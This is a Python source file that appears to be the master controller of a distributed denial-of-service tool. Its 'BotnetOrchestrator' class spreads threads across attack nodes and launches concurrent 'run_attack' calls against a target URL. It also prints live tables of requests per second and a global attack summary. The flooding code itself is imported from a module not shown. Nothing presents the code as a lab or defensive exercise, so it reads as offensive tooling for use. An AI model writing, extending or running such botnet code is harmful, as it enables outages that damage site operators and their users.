import asyncio
import logging
import time
from typing import List, Dict, Any
from src.core.infrastructure.node_worker import AttackNode

class BotnetOrchestrator:
    """
    Master Node for managing attack execution.
    Handles single-node or real distributed node logic.
    """
    def __init__(self):
        self.nodes: List[AttackNode] = []
        self.logger = logging.getLogger("BotnetOrchestrator")
        self.is_running = False
        self._monitor_task = None

    def add_node(self, location: str = "Local"):
        node = AttackNode(location=location)
        self.nodes.append(node)
        return node

    async def launch_distributed_attack(self, target_url: str, vector: str, duration: int, total_threads: int, adaptive: bool = False):
        if not self.nodes:
            # Fallback to local node if none added
            self.add_node()

        self.is_running = True
        threads_per_node = total_threads // len(self.nodes)
        
        # UI Header for attack
        from rich.console import Console
        console = Console()
        
        if len(self.nodes) == 1:
            console.print(f"[bold white][*] Mode: Single-node | Threads: {total_threads}[/bold white]")
        else:
            console.print(f"[bold white][*] Mode: Distributed | Nodes: {len(self.nodes)} | Threads/Node: {threads_per_node}[/bold white]")

        # Start monitoring
        self._monitor_task = asyncio.create_task(self._monitoring_loop())

        tasks = []
        for node in self.nodes:
            tasks.append(
                asyncio.create_task(
                    node.run_attack(target_url, vector, duration, threads_per_node, adaptive)
                )
            )

        await asyncio.gather(*tasks)
        self.is_running = False
        if self._monitor_task:
            self._monitor_task.cancel()
        
        self._print_final_summary()

    async def _monitoring_loop(self):
        """
        Real-time Monitoring & Feedback.
        """
        from rich.console import Console
        from rich.table import Table
        console = Console()

        while self.is_running:
            await asyncio.sleep(5)
            
            table = Table(title="Live Attack Metrics", show_header=True, header_style="bold red")
            table.add_column("NODE ID", style="dim", width=15)
            table.add_column("LOCATION", width=12)
            table.add_column("STATUS", width=10)
            table.add_column("RPS", justify="right")
            table.add_column("ATTEMPTED", justify="right")
            table.add_column("LATENCY", justify="right")
            
            total_rps = 0
            total_attempted = 0
            
            for node in self.nodes:
                status = node.get_status()
                state = "ACTIVE" if status["active"] else "IDLE"
                table.add_row(
                    status["node_id"],
                    status["location"],
                    state,
                    f"{status['rps']:.2f}",
                    str(status["attempted"]),
                    f"{status['avg_latency']:.1f}ms"
                )
                total_rps += status["rps"]
                total_attempted += status["attempted"]
            
            table.add_section()
            table.add_row("TOTAL", "", "", f"{total_rps:.2f}", str(total_attempted), "")
            console.print(table)

    def _print_final_summary(self):
        total_completed = 0
        total_failed = 0
        total_timeout = 0
        
        for node in self.nodes:
            status = node.get_status()
            total_completed += status["completed"]
            total_failed += status["failed"]
            total_timeout += status["timeout"]
            
        from rich.console import Console
        console = Console()
        console.print("\n[bold grey37]--------------------------------------------------[/bold grey37]")
        console.print(" [bold red]GLOBAL ATTACK SUMMARY[/bold red]")
        console.print(f" [bold white]Total Nodes:[/bold white] {len(self.nodes)}")
        console.print(f" [bold white]Total Completed:[/bold white] [bold green]{total_completed}[/bold green]")
        console.print(f" [bold white]Total Failed:[/bold white] [bold red]{total_failed}[/bold red]")
        console.print(f" [bold white]Total Timeout:[/bold white] [bold yellow]{total_timeout}[/bold yellow]")
        console.print("[bold grey37]--------------------------------------------------[/bold grey37]\n")
